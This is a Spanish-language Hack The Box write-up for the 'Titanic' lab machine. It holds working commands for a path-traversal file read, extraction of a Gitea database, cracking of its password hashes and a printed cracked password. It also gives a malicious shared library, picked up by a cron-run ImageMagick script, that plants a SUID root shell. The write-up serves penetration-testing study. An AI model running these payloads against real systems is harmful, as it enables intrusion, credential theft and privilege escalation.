@@ -1,0 +1,381 @@
+<h2 id="informaci-n-general">
+ Informaci&oacute;n General
+</h2>
+<h3 id="contexto-del-sistema">
+ Contexto del sistema
+</h3>
+<p>
+ El objetivo de este laboratorio corresponde a una m&aacute;quina Linux de Hack The Box accesible mediante la direcci&oacute;n IP
+ <code>
+  10.129.231.221
+ </code>
+ . El sistema expone un servicio web que simula una plataforma de compra de pasajes y un servicio SSH restringido. La m&aacute;quina presenta una cadena de vulnerabilidades realista que combina fallos de control de acceso, Local File Inclusion (LFI), exposici&oacute;n de bases de datos internas, cracking de credenciales y una escalada de privilegios mediante una vulnerabilidad conocida en ImageMagick ejecutada a trav&eacute;s de un script automatizado.
+</p>
+<p>
+ El compromiso completo sigue un flujo alineado con escenarios OSCP reales, donde la enumeraci&oacute;n exhaustiva y el an&aacute;lisis del c&oacute;digo fuente resultan determinantes para el &eacute;xito del ataque.
+</p>
+<h2 id="objetivos">
+ Objetivos
+</h2>
+<h3 id="alcance-del-compromiso">
+ Alcance del compromiso
+</h3>
+<p>
+ El objetivo es obtener acceso inicial al sistema a trav&eacute;s del servicio web, extraer informaci&oacute;n sensible mediante LFI, recuperar credenciales v&aacute;lidas para acceso SSH, comprometer una cuenta de usuario interna y finalmente escalar privilegios hasta
+ <code>
+  root
+ </code>
+ explotando una vulnerabilidad cr&iacute;tica en ImageMagick ejecutada mediante un script automatizado del sistema.
+</p>
+<h2 id="enumeraci-n">
+ Enumeraci&oacute;n
+</h2>
+<h3 id="escaneo-de-puertos-y-servicios">
+ Escaneo de puertos y servicios
+</h3>
+<p>
+ La enumeraci&oacute;n comienza con un escaneo completo de puertos TCP para identificar la superficie de ataque expuesta por el sistema, priorizando rapidez y evitando resoluci&oacute;n DNS.
+</p>
+<pre><code class="lang-bash">sudo nmap -p- -sS -Pn -n --open --min-rate <span class="hljs-number">6500</span> --max-retries <span class="hljs-number">1</span> --initial-rtt-timeout <span class="hljs-number">100</span>ms --max-rtt-timeout <span class="hljs-number">300</span>ms -T4 <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oG allPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img1.png"/>
+</p>
+<p>
+ El resultado revela &uacute;nicamente los puertos 22 (SSH) y 80 (HTTP). Con esta informaci&oacute;n se procede a un escaneo m&aacute;s espec&iacute;fico para identificar versiones y tecnolog&iacute;as.
+</p>
+<pre><code class="lang-bash">nmap -p22,<span class="hljs-number">80</span> -sCV <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.221</span> -oN infoPortsTCP
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img2.png"/>
+</p>
+<p>
+ El puerto 80 aloja una aplicaci&oacute;n web personalizada, mientras que SSH parece restringido a usuarios internos, descartando un acceso directo en esta fase inicial.
+</p>
+<h3 id="enumeraci-n-web-y-directorios">
+ Enumeraci&oacute;n web y directorios
+</h3>
+<p>
+ Al acceder al servicio web, se presenta un panel que simula un sistema de compra de pasajes.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img3.png"/>
+</p>
+<p>
+ La aplicaci&oacute;n permite reservar un pasaje mediante un bot&oacute;n ubicado en la esquina superior derecha.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img4.png"/>
+</p>
+<p>
+ Tras completar el proceso de reserva, el sistema genera autom&aacute;ticamente un archivo en formato JSON que se descarga al cliente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img5.png"/>
+</p>
+<p>
+ La descarga de archivos generados din&aacute;micamente es siempre un punto cr&iacute;tico en entornos CTF y escenarios reales, por lo que se decide interceptar la solicitud utilizando Burp Suite para analizar su comportamiento interno.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img6.png"/>
+</p>
+<p>
+ En la respuesta del servidor se identifica un endpoint interesante:
+</p>
+<pre><code>/download?ticket=<span class="hljs-number">57</span>c2e28b<span class="hljs-number">-8</span>a85<span class="hljs-number">-4</span>ba3-a9a1<span class="hljs-number">-3</span>b24a10abcd8.json
+</code></pre>
+<p>
+ Este par&aacute;metro sugiere que el backend utiliza directamente el valor proporcionado para acceder a archivos en el sistema.
+</p>
+<h3 id="tecnolog-as-y-archivos-expuestos">
+ Tecnolog&iacute;as y archivos expuestos
+</h3>
+<p>
+ Al manipular el par&aacute;metro
+ <code>
+  ticket
+ </code>
+ , se comprueba la existencia de una vulnerabilidad de Local File Inclusion. Al introducir un payload de traversal cl&aacute;sico, el servidor devuelve correctamente el contenido del archivo solicitado.
+</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img7.png"/>
+</p>
+<p>
+ Si bien el LFI es funcional, inicialmente no se logra extraer informaci&oacute;n cr&iacute;tica adicional, por lo que se decide continuar con la enumeraci&oacute;n para encontrar nuevas superficies de ataque.
+</p>
+<p>
+ Se procede a enumerar virtual hosts utilizando
+ <code>
+  ffuf
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">ffuf -u http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">//</span> -H <span class="hljs-string">"Host: FUZZ.titanic.htb"</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">110000</span>.txt -t <span class="hljs-number">200</span> -fs <span class="hljs-number">0</span> -fl <span class="hljs-number">10</span>
+</code></pre>
+<p>
+ El escaneo revela un subdominio adicional.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img8.png"/>
+</p>
+<p>
+ El virtual host identificado es:
+</p>
+<pre><code>dev<span class="hljs-selector-class">.titanic</span><span class="hljs-selector-class">.htb</span>
+</code></pre>
+<p>
+ Al acceder a este subdominio, se descubre una instancia de Gitea expuesta p&uacute;blicamente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img9.png"/>
+</p>
+<h2 id="explotaci-n">
+ Explotaci&oacute;n
+</h2>
+<h3 id="identificaci-n-de-la-vulnerabilidad">
+ Identificaci&oacute;n de la vulnerabilidad
+</h3>
+<p>
+ Se procede a registrar una cuenta en la instancia de Gitea para acceder a las funcionalidades internas. Una vez autenticado, se navega a la secci&oacute;n
+ <strong>
+  Explore
+ </strong>
+ , donde se listan repositorios p&uacute;blicos.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img10.png"/>
+</p>
+<p>
+ Se identifican dos repositorios relevantes:
+ <code>
+  docker-config
+ </code>
+ y
+ <code>
+  flask-app
+ </code>
+ . El repositorio
+ <code>
+  docker-config
+ </code>
+ resulta especialmente interesante, ya que contiene configuraciones relacionadas con Docker, Gitea y MySQL, lo que sugiere que refleja fielmente el entorno de la m&aacute;quina v&iacute;ctima.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img11.png"/>
+</p>
+<p>
+ Al descargar y descomprimir el repositorio, se observa la estructura completa del proyecto.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img12.png"/>
+</p>
+<h3 id="ejecuci-n-remota-de-comandos">
+ Ejecuci&oacute;n remota de comandos
+</h3>
+<p>
+ Con el objetivo de comprender el entorno real, se decide levantar localmente la infraestructura definida en los archivos Docker. Se inicia primero el contenedor de MySQL, ya que ambos servicios funcionan de forma independiente.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img13.png"/>
+</p>
+<p>
+ Antes de levantar Gitea, se ajusta la ruta de vol&uacute;menes en el archivo
+ <code>
+  docker-compose.yml
+ </code>
+ para replicar el entorno real.
+</p>
+<pre><code><span class="hljs-symbol">volumes:</span>
+  - <span class="hljs-regexp">/tmp/data</span><span class="hljs-symbol">:/data</span>
+</code></pre>
+<p>
+ Posteriormente, se levanta el contenedor de Gitea.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img14.png"/>
+</p>
+<p>
+ Una vez iniciado, se accede a la interfaz web local.
+</p>
+<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1:3000</span>
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img15.png"/>
+</p>
+<p>
+ Se mantiene la configuraci&oacute;n por defecto y se completa la instalaci&oacute;n. Luego, se accede al contenedor para inspeccionar su contenido interno.
+</p>
+<pre><code class="lang-bash">docker exec -<span class="hljs-keyword">it</span> gitea bash
+</code></pre>
+<p>
+ Dentro del contenedor se identifica el archivo
+ <code>
+  gitea.db
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img16.png"/>
+</p>
+<p>
+ Este an&aacute;lisis, combinado con la vulnerabilidad LFI previamente identificada, permite inferir la ruta real del archivo de base de datos en la m&aacute;quina v&iacute;ctima.
+</p>
+<pre><code><span class="hljs-regexp">/home/</span>developer<span class="hljs-regexp">/gitea/</span>data<span class="hljs-regexp">/gitea/gi</span>tea.db
+</code></pre>
+<h3 id="obtenci-n-de-acceso-interactivo">
+ Obtenci&oacute;n de acceso interactivo
+</h3>
+<p>
+ Utilizando nuevamente el LFI, se descarga directamente la base de datos de Gitea desde el servidor.
+</p>
+<pre><code>http:<span class="hljs-regexp">//</span>titanic.htb<span class="hljs-regexp">/download?ticket=/</span>home<span class="hljs-regexp">/developer/gi</span>tea<span class="hljs-regexp">/data/gi</span>tea<span class="hljs-regexp">/gitea.db</span>
+</code></pre>
+<p>
+ Una vez obtenida la base de datos, se analiza utilizando
+ <code>
+  sqlite3
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">sqlite3 gitea<span class="hljs-meta">.db</span>
+</code></pre>
+<p>
+ Se enumeran las tablas disponibles.
+</p>
+<pre><code class="lang-sql"><span class="hljs-title">.tables</span>
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img17.png"/>
+</p>
+<p>
+ Dentro de la tabla
+ <code>
+  user
+ </code>
+ se identifican hashes de contrase&ntilde;as. El an&aacute;lisis revela que Gitea utiliza PBKDF2, lo que requiere un procesamiento espec&iacute;fico para su cracking.
+</p>
+<p>
+ Se extraen los campos relevantes.
+</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">PRAGMA</span> table_info(<span class="hljs-keyword">user</span>);
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>, passwd, <span class="hljs-keyword">salt</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;
+</code></pre>
+<p>
+ Para convertir estos valores a un formato compatible con Hashcat, se utiliza la herramienta oficial
+ <code>
+  gitea2hashcat.py
+ </code>
+ .
+</p>
+<pre><code class="lang-bash">python3 gitea2hashcat<span class="hljs-selector-class">.py</span> <span class="hljs-string">'8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'</span>
+</code></pre>
+<p>
+ El hash resultante se crackea con Hashcat.
+</p>
+<pre><code class="lang-bash">hashcat -m <span class="hljs-number">10900</span> hash <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img18.png"/>
+</p>
+<p>
+ La contrase&ntilde;a recuperada es:
+</p>
+<pre><code><span class="hljs-number">25282528</span>
+</code></pre>
+<p>
+ Con estas credenciales, se accede exitosamente v&iacute;a SSH y se obtiene la flag de usuario.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img19.png"/>
+</p>
+<h2 id="subida-de-privilegios">
+ Subida de privilegios
+</h2>
+<h3 id="enumeraci-n-de-vectores-de-escalada">
+ Enumeraci&oacute;n de vectores de escalada
+</h3>
+<p>
+ Una vez autenticado como
+ <code>
+  developer
+ </code>
+ , se realiza una enumeraci&oacute;n b&aacute;sica del sistema. Al no identificar vectores evidentes, se ejecuta
+ <code>
+  linpeas.sh
+ </code>
+ para una inspecci&oacute;n m&aacute;s profunda.
+</p>
+<p>
+ Durante el an&aacute;lisis, se detecta un directorio de scripts perteneciente a la aplicaci&oacute;n.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img20.png"/>
+</p>
+<p>
+ Dentro de este directorio se encuentra un script que utiliza
+ <code>
+  /usr/bin/magick
+ </code>
+ .
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img21.png"/>
+</p>
+<h3 id="an-lisis-de-la-vulnerabilidad">
+ An&aacute;lisis de la vulnerabilidad
+</h3>
+<p>
+ Se verifica la versi&oacute;n de ImageMagick instalada en el sistema.
+</p>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img22.png"/>
+</p>
+<p>
+ La versi&oacute;n corresponde a una afectada por la vulnerabilidad documentada en el advisory oficial:
+</p>
+<pre><code>GHSA<span class="hljs-number">-8</span>rxc<span class="hljs-number">-922</span>v-phg8
+</code></pre>
+<p>
+ El script vulnerable es el siguiente:
+</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">cat</span> identify_images.<span class="hljs-keyword">sh</span>
+</code></pre>
+<p>
+ El script cambia al directorio de im&aacute;genes y ejecuta
+ <code>
+  magick identify
+ </code>
+ sobre todos los archivos
+ <code>
+  .jpg
+ </code>
+ , lo que permite la carga din&aacute;mica de bibliotecas compartidas desde el mismo directorio.
+</p>
+<h3 id="explotaci-n-y-obtenci-n-de-root">
+ Explotaci&oacute;n y obtenci&oacute;n de root
+</h3>
+<p>
+ Se navega al directorio donde se ejecuta el script y se compila una biblioteca maliciosa que ser&aacute; cargada autom&aacute;ticamente por ImageMagick.
+</p>
+<pre><code class="lang-bash">cd /opt/app/<span class="hljs-keyword">static</span>/assets/images
+gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+__attribute__((constructor)) void init(){
+    system(<span class="hljs-string">"cp /bin/sh /tmp &amp;&amp; chmod u+s /tmp/sh"</span>)<span class="hljs-comment">;</span>
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
+}
+EOF
+</code></pre>
+<p>
+ <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/titanic/img23.png"/>
+</p>
+<p>
+ Tras esperar a la ejecuci&oacute;n autom&aacute;tica del script mediante cron, se obtiene una shell con privilegios elevados.
+</p>
+<pre><code class="lang-bash">/tmp/sh -<span class="hljs-selector-tag">p</span>
+whoami
+</code></pre>
